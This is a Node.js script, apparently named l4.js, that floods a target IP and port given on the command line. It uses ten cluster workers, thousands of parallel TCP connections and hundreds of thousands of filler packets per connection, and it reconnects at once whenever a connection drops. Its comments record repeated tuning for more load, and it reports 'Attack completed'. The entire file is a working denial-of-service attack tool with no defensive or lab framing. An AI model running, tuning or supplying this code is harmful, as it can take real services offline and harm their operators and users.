const net = require('net');
const async = require('async');
const cluster = require('cluster');

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork more workers
  for (let i = 0; i < 10; i++) { // Increase the number of workers
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died`);
    cluster.fork();
  });
} else {
  // Get the target IP address and port from command-line arguments
  const targetIP = process.argv[2];
  const targetPort = parseInt(process.argv[3], 10);

  // Check if both IP and port are provided
  if (!targetIP || isNaN(targetPort)) {
    console.error('Usage: node l4.js <targetIP> <targetPort>');
    process.exit(1);
  }

  // Set the fragment size (must be less than the MTU)
  const fragmentSize = 1000; // Increase the fragment size

  // Number of concurrent connections
  const numConnections = 2000; // Further increase the number of connections

  // Number of packets to send per connection
  const numPackets = 200000; // Further increase the number of packets

  // Function to send packets
  function sendPackets(socket, callback) {
    let i = 0;

    function sendPacket() {
      if (i >= numPackets) {
        socket.end();
        return callback();
      }

      const packet = Buffer.alloc(fragmentSize);
      packet.fill('A', 0, fragmentSize);

      if (!socket.write(packet)) {
        socket.once('drain', sendPacket);
      } else {
        socket.write(Buffer.from([0x00, 0x00, 0x00, 0x00])); // Fragmentation header
        i++;
        process.nextTick(sendPacket); // Use process.nextTick for faster execution
      }
    }

    sendPacket();
  }

  // Function to connect and send packets
  function connectAndSend(callback) {
    const socket = new net.Socket();
    socket.setNoDelay(true);
    socket.setMaxListeners(0);

    let callbackCalled = false;

    function safeCallback(err) {
      if (!callbackCalled) {
        callbackCalled = true;
        callback(err);
      }
    }

    socket.connect(targetPort, targetIP, () => {
      console.log('Connected to target');
      sendPackets(socket, safeCallback);
    });

    // Handle errors
    socket.on('error', (err) => {
      console.error('Socket error:', err);
      if (err.code === 'ECONNRESET' || err.code === 'EPIPE') {
        console.log('Retrying connection...');
        setTimeout(() => connectAndSend(safeCallback), 10); // Further decrease retry delay
      } else {
        safeCallback(err);
      }
    });

    socket.on('close', () => {
      console.log('Connection closed, retrying...');
      setTimeout(() => connectAndSend(safeCallback), 10); // Further decrease retry delay
    });
  }

  // Create an array of tasks
  const tasks = Array.from({ length: numConnections }, (_, i) => (callback) => connectAndSend(callback));

  // Start multiple connections using async
  async.parallelLimit(tasks, 500, (err) => { // Further increase parallel limit
    if (err) {
      console.error('Error during attack:', err);
    } else {
      console.log('Attack completed');
    }
  });

  console.log(`Worker ${process.pid} started`);
}